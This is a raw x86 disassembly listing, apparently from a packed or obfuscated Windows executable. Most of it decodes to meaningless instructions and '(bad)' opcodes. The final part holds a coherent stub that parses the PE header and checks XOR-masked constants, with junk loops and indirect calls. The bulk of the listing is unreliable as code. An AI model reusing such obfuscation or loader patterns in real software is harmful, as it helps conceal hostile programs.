  41f21c:	fimul  DWORD PTR [esi]
  41f21e:	and    eax,0xdb88c1ee
  41f223:	jecxz  0x41f1cc
  41f225:	not    BYTE PTR [ecx+0x62]
  41f228:	popa   
  41f229:	scas   eax,DWORD PTR es:[edi]
  41f22a:	xor    ah,ah
  41f22c:	mov    ecx,0xcd2ab6ae
  41f231:	and    esi,DWORD PTR [ebx+ecx*8+0x7fee2d92]
  41f238:	xor    BYTE PTR [ecx-0x29d12ea8],0xa0
  41f23f:	dec    ebx
  41f240:	rol    DWORD PTR [edx-0x18],1
  41f243:	jg     0x41f26d
  41f245:	xchg   ebx,eax
  41f246:	and    al,0xfc
  41f248:	mov    esp,gs
  41f24a:	rcr    BYTE PTR [edx-0x51026834],1
  41f250:	mov    WORD PTR [ebx-0x38b79a90],ss
  41f256:	in     eax,dx
  41f257:	das    
  41f258:	jecxz  0x41f20c
  41f25a:	or     esp,esi
  41f25c:	add    ebx,DWORD PTR [edi-0x31]
  41f25f:	cli    
  41f260:	stos   BYTE PTR es:[edi],al
  41f261:	je     0x41f2c8
  41f263:	mov    bl,0xe5
  41f265:	mov    ebp,0x62a42071
  41f26a:	ds mov al,0xaa
  41f26d:	dec    edx
  41f26e:	inc    edi
  41f26f:	cmp    BYTE PTR [esi-0x56],bl
  41f272:	bound  ecx,QWORD PTR [esi-0x608207d]
  41f278:	and    ch,BYTE PTR [edi]
  41f27a:	test   BYTE PTR [eax],dl
  41f27c:	mov    BYTE PTR [ebp-0x3e],al
  41f27f:	jne    0x41f292
  41f281:	add    BYTE PTR [edx+edx*1-0x77],ch
  41f285:	das    
  41f286:	push   esp
  41f287:	aad    0xeb
  41f289:	bound  ecx,QWORD PTR ds:[esi+esi*4-0xc]
  41f28e:	fwait
  41f28f:	jnp    0x41f23c
  41f291:	xor    al,0x12
  41f293:	mov    edi,0xf7a9c230
  41f298:	push   ecx
  41f299:	jo     0x41f21d
  41f29b:	adc    al,0x9
  41f29d:	xchg   esp,eax
  41f29e:	inc    esp
  41f29f:	fistp  WORD PTR [eax+0x623d36ac]
  41f2a5:	xchg   edx,eax
  41f2a6:	and    DWORD PTR [edx+0x63c6f9ec],ebx
  41f2ac:	loop   0x41f292
  41f2ae:	dec    esi
  41f2af:	mov    edi,0xf34538ec
  41f2b4:	push   ss
  41f2b5:	jge    0x41f23c
  41f2b7:	mov    bh,0x36
  41f2b9:	xchg   ebx,eax
  41f2ba:	mov    bh,0x90
  41f2bc:	push   ss
  41f2bd:	pmulhuw mm7,QWORD PTR [edx+0x6f1a9ebe]
  41f2c4:	pusha  
  41f2c5:	clc    
  41f2c6:	cld    
  41f2c7:	pop    ds
  41f2c8:	rcl    ch,cl
  41f2ca:	out    dx,eax
  41f2cb:	shl    BYTE PTR [ecx+0x3e],0x80
  41f2cf:	add    ecx,DWORD PTR [edx+edx*2-0x27]
  41f2d3:	adc    al,0x58
  41f2d5:	or     ebx,DWORD PTR [esi-0x360570aa]
  41f2db:	jmp    FWORD PTR [ebx+0x60471e39]
  41f2e1:	dec    ebp
  41f2e2:	jmp    0x41f2d0
  41f2e4:	cmp    cl,ah
  41f2e6:	nop
  41f2e7:	adc    dh,0x97
  41f2ea:	icebp  
  41f2eb:	inc    esi
  41f2ec:	sbb    eax,0x2ce668fc
  41f2f1:	pop    es
  41f2f2:	ficom  DWORD PTR [edi-0x4b8b5f67]
  41f2f8:	jg     0x41f2df
  41f2fa:	scas   al,BYTE PTR es:[edi]
  41f2fb:	loop   0x41f357
  41f2fd:	mov    ebp,0xe3dfc559
  41f302:	(bad)  
  41f303:	mov    al,ds:0xa5d82e9
  41f308:	and    esp,DWORD PTR [edi-0x7b]
  41f30b:	inc    ebp
  41f30c:	call   0xc65fb44e
  41f311:	call   0xf72ac1f4
  41f316:	les    ecx,FWORD PTR [esi-0x47d45309]
  41f31c:	jl     0x41f352
  41f31e:	imul   ebx,esi,0x2a
  41f321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f322:	dec    eax
  41f323:	neg    ebp
  41f325:	sub    al,0x80
  41f327:	ja     0x41f372
  41f329:	rol    ebp,cl
  41f32b:	add    al,bh
  41f32d:	shr    BYTE PTR [eax+0x1f],cl
  41f330:	inc    ecx
  41f331:	(bad)  
  41f332:	sub    bl,al
  41f334:	scas   eax,DWORD PTR es:[edi]
  41f335:	out    0xc4,al
  41f337:	xor    ah,dl
  41f339:	sub    cl,BYTE PTR [ebx+0xd9fe7ae]
  41f33f:	push   ss
  41f340:	fistp  QWORD PTR [eax]
  41f342:	pop    esi
  41f343:	out    dx,eax
  41f344:	adc    BYTE PTR [edx],bl
  41f346:	pop    ds
  41f347:	lds    edi,FWORD PTR [edi+0x4e9e2e48]
  41f34d:	adc    BYTE PTR [esi-0x3a3caff3],cl
  41f353:	lods   eax,DWORD PTR ds:[esi]
  41f354:	mov    cl,BYTE PTR [ecx-0x31de78c1]
  41f35a:	mov    ecx,DWORD PTR [edx]
  41f35c:	fiadd  DWORD PTR [esi+0xaccdeb4]
  41f362:	aaa    
  41f363:	jno    0x41f310
  41f365:	add    ah,BYTE PTR ds:0xca3c4eed
  41f36b:	pop    esi
  41f36c:	or     esi,DWORD PTR [edx+0x20775467]
  41f372:	ficom  DWORD PTR [ecx]
  41f374:	int    0x43
  41f376:	test   al,0xf8
  41f378:	push   ecx
  41f379:	js     0x41f3bd
  41f37b:	in     al,0xd1
  41f37d:	into   
  41f37e:	das    
  41f37f:	repz jle 0x41f34b
  41f382:	sbb    BYTE PTR [edi-0x64],ch
  41f385:	push   esi
  41f386:	lahf   
  41f387:	pusha  
  41f388:	add    eax,0xd48da8b5
  41f38d:	ss pop esi
  41f38f:	xor    eax,0x6761c3
  41f394:	(bad)
  41f397:	push   ebp
  41f398:	sbb    ebp,DWORD PTR [eax]
  41f39a:	(bad)  
  41f39b:	gs dec ebx
  41f39d:	shr    BYTE PTR [ebx-0x1a],1
  41f3a0:	imul   ebx,esp,0x71
  41f3a3:	bound  ebp,QWORD PTR [eax-0x33160e42]
  41f3a9:	xchg   edi,eax
  41f3aa:	push   ebp
  41f3ab:	mov    dl,0x4e
  41f3ad:	int    0xf1
  41f3af:	or     eax,0x5c48e82a
  41f3b4:	inc    esp
  41f3b5:	jbe    0x41f3e6
  41f3b7:	pop    es
  41f3b8:	jne    0x41f388
  41f3ba:	call   0xadf2:0x534ce5b6
  41f3c1:	clc    
  41f3c2:	inc    DWORD PTR [edx-0x45bb885d]
  41f3c8:	and    esi,eax
  41f3ca:	sbb    eax,0x305b3d1e
  41f3cf:	inc    edx
  41f3d0:	int    0xaa
  41f3d2:	add    al,0xf6
  41f3d4:	mov    edi,0xb7bfc725
  41f3d9:	lods   eax,DWORD PTR ds:[esi]
  41f3da:	je     0x41f3a7
  41f3dc:	mov    dh,0xe6
  41f3de:	loopne 0x41f3c3
  41f3e0:	push   edi
  41f3e1:	push   0x72
  41f3e3:	cli    
  41f3e4:	push   esi
  41f3e5:	dec    ebp
  41f3e6:	xchg   edx,eax
  41f3e7:	(bad)  
  41f3e8:	cs sub al,0x7f
  41f3eb:	enter  0xd1e8,0xe4
  41f3ef:	mov    ss,edx
  41f3f1:	jmp    0xd2ec0642
  41f3f6:	inc    eax
  41f3f7:	ret    0xfd84
  41f3fa:	cmp    ah,ah
  41f3fc:	mov    esi,0xbfefce23
  41f401:	loopne 0x41f3ad
  41f403:	pop    ss
  41f404:	fs pop edi
  41f406:	cmp    al,0xcb
  41f408:	enter  0x3954,0x67
  41f40c:	mov    ebx,0x2f482121
  41f411:	jo     0x41f3d9
  41f413:	mov    cs,edi
  41f415:	in     eax,dx
  41f416:	icebp  
  41f417:	add    esp,eax
  41f419:	sub    BYTE PTR [ecx+0x54],ah
  41f41c:	test   eax,0xdaef3d64
  41f421:	xchg   esi,eax
  41f422:	popf   
  41f423:	in     eax,0x63
  41f425:	dec    edx
  41f426:	out    dx,al
  41f427:	pop    esi
  41f428:	xchg   eax,edi
  41f42a:	push   0x45da55a0
  41f42f:	pop    ebx
  41f430:	add    al,0x3b
  41f432:	fld    st(6)
  41f434:	pop    edx
  41f435:	repnz mov ch,0xa2
  41f438:	mov    ?,WORD PTR [esi-0x4870313]
  41f43e:	pushf  
  41f43f:	xchg   bp,ax
  41f441:	mov    edx,0x94489fc0
  41f446:	idiv   DWORD PTR ds:[edx-0x6f]
  41f44a:	lock xor ebx,DWORD PTR [edi-0x47dc16c4]
  41f451:	test   BYTE PTR [ebp-0xd],dh
  41f454:	inc    esi
  41f455:	data16 daa 
  41f457:	sub    bl,bh
  41f459:	(bad)  
  41f45a:	jl     0x41f3fb
  41f45c:	mov    ah,0x9a
  41f45e:	aas    
  41f45f:	and    eax,0x68feb5ea
  41f464:	cmp    eax,0xceeec595
  41f469:	jl     0x41f434
  41f46b:	fisubr WORD PTR [edi+0x42]
  41f46e:	sbb    ah,BYTE PTR [eax-0x684cdcac]
  41f474:	xchg   ebx,eax
  41f475:	push   0x796daa52
  41f47a:	add    al,0xf1
  41f47c:	fcomp  st(5)
  41f47e:	loope  0x41f4f6
  41f480:	mov    al,0xba
  41f482:	xor    ebx,DWORD PTR [ebp-0x9916728]
  41f488:	imul   ecx,DWORD PTR [ecx+0x18],0x11
  41f48c:	addr16 jmp 0xa91f9e99
  41f492:	pop    ebp
  41f493:	sub    DWORD PTR [ebx+0x63],ecx
  41f496:	sbb    DWORD PTR [ecx+edx*4+0x31],0xe5c22431
  41f49e:	lods   eax,DWORD PTR ds:[esi]
  41f49f:	retf   0x64ed
  41f4a2:	jnp    0x41f4f6
  41f4a4:	jl     0x41f429
  41f4a6:	mov    ah,0xbb
  41f4a8:	jge    0x41f4a9
  41f4aa:	mov    esp,0x9c623811
  41f4af:	into   
  41f4b0:	jmp    DWORD PTR [esp+ebx*8]
  41f4b3:	lahf   
  41f4b4:	test   al,0x75
  41f4b6:	repz aad 0x8e
  41f4b9:	(bad)  
  41f4ba:	aam    0x2c
  41f4bc:	leave  
  41f4bd:	int    0x76
  41f4bf:	xchg   esp,eax
  41f4c0:	sbb    cl,BYTE PTR [esi-0xc]
  41f4c3:	fimul  WORD PTR [ebx-0x7341fcaf]
  41f4c9:	clc    
  41f4ca:	jge    0x41f51b
  41f4cc:	ret    
  41f4cd:	add    BYTE PTR [edi+0x5bae3ff5],al
  41f4d3:	inc    ebp
  41f4d4:	and    DWORD PTR [ebx-0x45],ebp
  41f4d7:	push   edx
  41f4d8:	jecxz  0x41f4f7
  41f4da:	xchg   ebp,eax
  41f4db:	sbb    eax,0x703556cb
  41f4e0:	frstor [eax-0x1a]
  41f4e3:	cwde   
  41f4e4:	jmp    0xf5f68c36
  41f4e9:	leave  
  41f4ea:	jmp    FWORD PTR ds:0x72080a38
  41f4f0:	lods   al,BYTE PTR ds:[esi]
  41f4f1:	mov    al,0x36
  41f4f3:	lods   al,BYTE PTR ds:[esi]
  41f4f4:	xor    DWORD PTR [ecx],esp
  41f4f6:	outs   dx,DWORD PTR ds:[esi]
  41f4f7:	adc    ebx,DWORD PTR [ecx+eax*1]
  41f4fa:	shr    edx,cl
  41f4fc:	popa   
  41f4fd:	or     al,0xe9
  41f4ff:	pushf  
  41f500:	sbb    eax,0x9b2f734f
  41f505:	loope  0x41f509
  41f507:	pop    esp
  41f508:	ficom  WORD PTR [eax]
  41f50a:	sahf   
  41f50b:	aad    0x77
  41f50d:	in     eax,0xe4
  41f50f:	mov    esp,0x8b602f75
  41f514:	(bad)  
  41f515:	pushf  
  41f516:	jne    0x41f558
  41f518:	adc    DWORD PTR [esi],0x811b38ea
  41f51e:	ja     0x41f4e8
  41f520:	lods   al,BYTE PTR ds:[esi]
  41f521:	push   ebx
  41f522:	inc    esi
  41f523:	sub    BYTE PTR es:[edi+ebx*4-0x18],al
  41f528:	imul   esp
  41f52a:	cmp    dh,ah
  41f52c:	xor    ecx,DWORD PTR [edi-0x6cc7f15e]
  41f532:	out    dx,al
  41f533:	lahf   
  41f534:	xor    ch,0x6f
  41f537:	outs   dx,BYTE PTR ds:[esi]
  41f538:	push   0x8
  41f53a:	xchg   esi,eax
  41f53b:	(bad)  
  41f53c:	adc    al,0x7a
  41f53e:	dec    eax
  41f53f:	mov    dh,0xd9
  41f541:	add    al,0x19
  41f543:	push   0xbc4f4c1d
  41f548:	out    dx,eax
  41f549:	ins    BYTE PTR es:[edi],dx
  41f54a:	aaa    
  41f54b:	cmc    
  41f54c:	xchg   edi,eax
  41f54d:	test   BYTE PTR [eax-0xd6e2cad],cl
  41f553:	adc    edx,DWORD PTR [eax+0x1c]
  41f556:	pop    edx
  41f557:	dec    eax
  41f558:	ins    BYTE PTR es:[edi],dx
  41f559:	adc    al,0x1d
  41f55b:	xchg   ebp,eax
  41f55c:	pushf  
  41f55d:	inc    DWORD PTR [eax-0x1b96293b]
  41f563:	mov    WORD PTR [ecx-0x5af67701],gs
  41f569:	push   esi
  41f56a:	dec    esi
  41f56b:	and    eax,0xd9131c3b
  41f570:	sar    bh,0x12
  41f573:	inc    ecx
  41f574:	push   es
  41f575:	mov    ah,0xa6
  41f577:	loopne 0x41f5d9
  41f579:	add    DWORD PTR [ecx],ebp
  41f57b:	inc    esp
  41f57c:	cmp    al,0x24
  41f57e:	mov    ?,edi
  41f580:	cli    
  41f581:	mov    ds:0xf42d6dd5,al
  41f586:	or     DWORD PTR [esi],ebx
  41f588:	xchg   DWORD PTR [ebp+0x47],edi
  41f58b:	mov    eax,ds:0xc1449f38
  41f590:	xchg   ecx,eax
  41f591:	dec    ecx
  41f592:	mov    WORD PTR [ebp-0x6bb05e00],ds
  41f598:	and    BYTE PTR [ecx+0x6f06a21d],dl
  41f59e:	call   0x4759:0xdacd3410
  41f5a5:	rcr    esp,cl
  41f5a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5a8:	pop    ecx
  41f5a9:	cmp    DWORD PTR [ebx-0x5c],edx
  41f5ac:	sbb    ch,bl
  41f5ae:	dec    eax
  41f5af:	xchg   esp,eax
  41f5b0:	dec    ebp
  41f5b1:	fmul   st(1),st
  41f5b3:	xchg   ebx,eax
  41f5b4:	pop    ebp
  41f5b5:	mov    ebx,0xc8247c9
  41f5ba:	xchg   esi,eax
  41f5bb:	aas    
  41f5bc:	les    esi,FWORD PTR [esi+0x61617a0b]
  41f5c2:	lods   al,BYTE PTR cs:[esi]
  41f5c4:	test   BYTE PTR [esi],ah
  41f5c6:	mov    bh,0x1
  41f5c8:	(bad)  
  41f5c9:	out    dx,al
  41f5ca:	add    al,0x3b
  41f5cc:	rol    bh,cl
  41f5ce:	loope  0x41f621
  41f5d0:	out    dx,al
  41f5d1:	sub    ecx,DWORD PTR [eax-0x1f]
  41f5d4:	pop    esp
  41f5d5:	and    ebp,DWORD PTR [ecx+0x18]
  41f5d8:	inc    esp
  41f5d9:	xchg   esi,eax
  41f5da:	fnstcw WORD PTR [ecx-0x62429437]
  41f5e0:	sbb    ecx,DWORD PTR [eax]
  41f5e2:	dec    ecx
  41f5e3:	icebp  
  41f5e4:	xor    ebx,ecx
  41f5e6:	or     ch,cl
  41f5e8:	sahf   
  41f5e9:	lods   al,BYTE PTR ds:[esi]
  41f5ea:	sbb    dh,al
  41f5ec:	xchg   DWORD PTR [ecx-0x124ac366],esi
  41f5f2:	inc    ebp
  41f5f3:	fisub  DWORD PTR [ecx+0x130d3a71]
  41f5f9:	mov    esp,0xd8f60556
  41f5fe:	add    BYTE PTR [ebx+0x69],bh
  41f601:	pop    ds
  41f602:	sar    dl,cl
  41f604:	bound  ecx,QWORD PTR [ecx+0x37]
  41f607:	sbb    eax,0x89604114
  41f60c:	clc    
  41f60d:	mov    edi,0x58cfe34a
  41f612:	push   cs
  41f613:	mov    esp,0x78ef0d01
  41f618:	test   BYTE PTR [ebx],dl
  41f61a:	sbb    DWORD PTR [eax-0x4d6d0249],esi
  41f620:	mov    edx,0x9e059d1d
  41f625:	xchg   esp,eax
  41f626:	loope  0x41f605
  41f628:	pop    es
  41f629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f62a:	or     DWORD PTR ds:0x8dfedd64,eax
  41f630:	ins    BYTE PTR es:[edi],dx
  41f631:	push   esi
  41f632:	xor    bl,BYTE PTR [ebp-0x1c3bae36]
  41f638:	jl     0x41f684
  41f63a:	cmp    eax,0x8d95a149
  41f63f:	sbb    bl,BYTE PTR [esi]
  41f641:	xchg   bl,al
  41f643:	mov    edx,0x70b08b30
  41f648:	inc    edi
  41f649:	mov    al,0x37
  41f64b:	arpl   WORD PTR [ecx-0x43aae172],bp
  41f651:	add    esp,ebx
  41f653:	loope  0x41f5e0
  41f655:	out    dx,al
  41f656:	les    ecx,FWORD PTR [ebx+0x11]
  41f659:	mov    dh,BYTE PTR [edi]
  41f65b:	outs   dx,DWORD PTR ds:[esi]
  41f65c:	lahf   
  41f65d:	sub    esp,DWORD PTR [eax-0x7c7fcc0f]
  41f663:	clc    
  41f664:	rol    DWORD PTR [edi-0x2a76a62e],0x14
  41f66b:	sub    ch,BYTE PTR [ebp-0x4b9f9ea4]
  41f671:	mov    ss,WORD PTR [ebp-0x7b29910b]
  41f677:	ficomp WORD PTR [eax+0x2e]
  41f67a:	pop    bp
  41f67c:	push   ds
  41f67d:	inc    DWORD PTR ds:0xfaa13c92
  41f683:	popa   
  41f684:	popa   
  41f685:	cmp    eax,DWORD PTR [ebx]
  41f687:	ror    DWORD PTR [esi],1
  41f689:	aaa    
  41f68a:	ins    DWORD PTR es:[edi],dx
  41f68b:	mov    DWORD PTR [ebp-0x3966e97],ecx
  41f691:	mov    ch,0xe1
  41f693:	outs   dx,DWORD PTR ds:[esi]
  41f694:	pop    ds
  41f695:	and    DWORD PTR cs:[edx+edi*8+0x293de2ef],0xffffffd6
  41f69e:	pop    ebx
  41f69f:	stos   BYTE PTR es:[edi],al
  41f6a0:	sbb    BYTE PTR [edx],bh
  41f6a2:	push   edx
  41f6a3:	pushf  
  41f6a4:	sbb    DWORD PTR [edi],edx
  41f6a6:	sbb    eax,0xf129d7fa
  41f6ab:	sbb    BYTE PTR [ebp+ecx*1+0x39],ah
  41f6af:	popf   
  41f6b0:	mov    DWORD PTR [edi-0x23],ebp
  41f6b3:	mov    bl,0xa0
  41f6b5:	lods   eax,DWORD PTR ds:[esi]
  41f6b6:	imul   ebp,DWORD PTR [ecx],0x526317c9
  41f6bc:	pusha  
  41f6bd:	repnz and eax,DWORD PTR [ecx-0x17]
  41f6c1:	mov    al,ds:0x2d78fa6c
  41f6c6:	sbb    ebp,ebp
  41f6c8:	out    dx,al
  41f6c9:	pushf  
  41f6ca:	out    0x93,eax
  41f6cc:	fstp   DWORD PTR [ecx-0x1e4560ac]
  41f6d2:	push   ds
  41f6d3:	pop    ss
  41f6d4:	jecxz  0x41f65d
  41f6d6:	loopne 0x41f71d
  41f6d8:	push   cs
  41f6d9:	push   es
  41f6da:	cmc    
  41f6db:	mov    cl,0x36
  41f6dd:	fwait
  41f6de:	push   edi
  41f6df:	psrlq  mm1,mm5
  41f6e2:	and    ecx,DWORD PTR [ebp+edi*1-0x5f]
  41f6e6:	(bad)
  41f6eb:	mov    DWORD PTR ds:0x6ab79b83,edi
  41f6f1:	outs   dx,BYTE PTR ds:[esi]
  41f6f2:	and    ebp,DWORD PTR [eax+esi*1]
  41f6f5:	in     eax,dx
  41f6f6:	xchg   ebp,eax
  41f6f7:	out    dx,eax
  41f6f8:	fdivr  st,st(4)
  41f6fa:	pushf  
  41f6fb:	push   ss
  41f6fc:	and    al,0x35
  41f6fe:	fbstp  TBYTE PTR [edx]
  41f700:	mov    eax,ds:0xf2196be2
  41f705:	enter  0xdfb7,0xd
  41f709:	dec    eax
  41f70a:	in     eax,dx
  41f70b:	xor    al,0xf4
  41f70d:	sti    
  41f70e:	aas    
  41f70f:	sbb    al,dl
  41f711:	js     0x41f698
  41f713:	and    BYTE PTR [edx+ebp*4-0x3e],ch
  41f717:	js     0x41f6f9
  41f719:	pusha  
  41f71a:	mov    bl,0xe6
  41f71c:	xchg   DWORD PTR [edi-0x2bd2affe],edx
  41f722:	int3   
  41f723:	stos   BYTE PTR es:[edi],al
  41f724:	cmp    ebx,DWORD PTR ds:0x3045f094
  41f72a:	int3   
  41f72b:	cmp    DWORD PTR [edx+0x67],edx
  41f72e:	cli    
  41f72f:	fcom   QWORD PTR [eax+0x71de553f]
  41f735:	pop    ebp
  41f736:	add    DWORD PTR [edi],ecx
  41f738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f739:	cmp    esi,DWORD PTR [ebp-0x33]
  41f73c:	push   ecx
  41f73d:	cmp    esp,DWORD PTR ds:0xb021bd64
  41f743:	lock fcomip st,st(2)
  41f746:	mov    gs,WORD PTR [ebp+0x4d]
  41f749:	mov    esi,DWORD PTR [eax-0x19]
  41f74c:	ror    DWORD PTR [eax],cl
  41f74e:	jns    0x41f709
  41f750:	mov    ch,0x32
  41f752:	inc    eax
  41f753:	lea    edx,[edi+0x78]
  41f756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f757:	out    0x29,al
  41f759:	push   cs
  41f75a:	adc    BYTE PTR es:[edi],0x98
  41f75e:	call   0x256e:0x674a50b1
  41f765:	jp     0x41f786
  41f767:	into   
  41f768:	int3   
  41f769:	dec    edi
  41f76a:	jg     0x41f77f
  41f76c:	in     al,0x45
  41f76e:	sub    BYTE PTR [eax],bh
  41f770:	xchg   edi,eax
  41f771:	loopne 0x41f746
  41f773:	js     0x41f6fb
  41f775:	out    dx,eax
  41f776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f777:	mov    al,ch
  41f779:	lods   eax,DWORD PTR ds:[esi]
  41f77a:	iret   
  41f77b:	pop    ss
  41f77c:	xor    ebp,DWORD PTR [esi]
  41f77e:	mov    ebx,0x361c43a9
  41f783:	jae    0x41f725
  41f785:	mov    DWORD PTR [esi+0x4f],ebp
  41f788:	shl    eax,cl
  41f78a:	fld    TBYTE PTR [ebx-0x1e09676c]
  41f790:	stos   DWORD PTR es:[edi],eax
  41f791:	js     0x41f7dd
  41f793:	adc    esi,ebx
  41f795:	mov    bh,0xf1
  41f797:	das    
  41f798:	xor    al,0x9a
  41f79a:	jns    0x41f767
  41f79c:	push   ebx
  41f79d:	popf   
  41f79e:	inc    ecx
  41f79f:	adc    BYTE PTR [ebx+0x3a],ah
  41f7a2:	scas   al,BYTE PTR es:[edi]
  41f7a3:	xchg   ecx,eax
  41f7a4:	mov    edi,0xd96d6c9d
  41f7a9:	in     eax,0x33
  41f7ab:	inc    edi
  41f7ac:	and    ch,0x62
  41f7af:	sbb    bl,BYTE PTR [ecx-0x55]
  41f7b2:	ins    DWORD PTR es:[edi],dx
  41f7b3:	ins    BYTE PTR es:[edi],dx
  41f7b4:	das    
  41f7b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7b6:	xchg   edi,eax
  41f7b7:	sbb    cl,BYTE PTR [ebp+eiz*2-0x49673232]
  41f7be:	add    BYTE PTR [edi-0x2f72718a],0x20
  41f7c5:	xchg   edx,eax
  41f7c6:	js     0x41f77f
  41f7c8:	div    BYTE PTR [ebp+edi*2-0x2d26b22]
  41f7cf:	int3   
  41f7d0:	mov    cl,0x1d
  41f7d2:	jecxz  0x41f781
  41f7d4:	std    
  41f7d5:	mov    eax,0xb8aec28f
  41f7da:	xor    BYTE PTR [esi],0xb3
  41f7dd:	std    
  41f7de:	sbb    edi,DWORD PTR [edi-0x1]
  41f7e1:	(bad)  
  41f7e2:	ror    dl,1
  41f7e4:	add    DWORD PTR [ebx+0x57],ecx
  41f7e7:	retf   0x3de6
  41f7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7eb:	push   edx
  41f7ec:	push   es
  41f7ed:	xchg   esi,eax
  41f7ee:	and    ebx,edi
  41f7f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7f1:	retf   
  41f7f2:	cmp    DWORD PTR [ebp-0x782198f7],ebx
  41f7f8:	popf   
  41f7f9:	mov    BYTE PTR [ecx],ch
  41f7fb:	xor    eax,0x38180ed3
  41f800:	dec    ebp
  41f801:	fucomip st,st(1)
  41f803:	jae    0x41f84f
  41f805:	xor    eax,0x96d13e72
  41f80a:	aas    
  41f80b:	mov    es,WORD PTR [edi+0x1a05360a]
  41f811:	sub    BYTE PTR [edi+0x6b],0x5a
  41f815:	int    0xc8
  41f817:	popf   
  41f818:	lds    edx,FWORD PTR [ebp-0x58]
  41f81b:	dec    eax
  41f81c:	push   edi
  41f81d:	std    
  41f81e:	pop    ds
  41f81f:	fs sbb al,0x57
  41f822:	(bad)  
  41f823:	dec    eax
  41f824:	push   esi
  41f825:	add    DWORD PTR [ebp-0x4b],0xffffff8b
  41f829:	call   0x24cc:0x6cf4830b
  41f830:	xchg   edx,eax
  41f831:	xchg   BYTE PTR [ebp-0x26ca1682],cl
  41f837:	add    eax,0x5a68646d
  41f83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f83d:	mov    edx,0x71558ffc
  41f842:	lods   al,BYTE PTR ds:[esi]
  41f843:	xor    ebx,esp
  41f845:	push   es
  41f846:	jns    0x41f82b
  41f848:	repz inc edi
  41f84a:	stos   DWORD PTR es:[edi],eax
  41f84b:	aam    0xd
  41f84d:	pop    es
  41f84e:	(bad)  
  41f84f:	ror    BYTE PTR [ecx+0x7a],1
  41f852:	sub    al,0x21
  41f854:	cmp    BYTE PTR [edx+0x4],al
  41f857:	test   eax,0xa35db29e
  41f85c:	fdiv   DWORD PTR [ecx+0x6b84c31c]
  41f862:	xchg   edi,eax
  41f863:	aaa    
  41f864:	pop    edx
  41f865:	add    eax,0x13233fe2
  41f86a:	sub    ebp,ebp
  41f86c:	mov    dh,0x63
  41f86e:	inc    edi
  41f86f:	aaa    
  41f870:	pop    edx
  41f871:	ret    0x500a
  41f874:	and    al,0xba
  41f876:	cli    
  41f877:	jb     0x41f8ab
  41f879:	add    BYTE PTR [ebx],ch
  41f87b:	ret    0xd0b
  41f87e:	mov    ecx,0xb900426e
  41f883:	mov    bl,0x8
  41f885:	push   ecx
  41f886:	pop    es
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d55
  41f8e9:	mov    edx,DWORD PTR ds:0x42af4d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
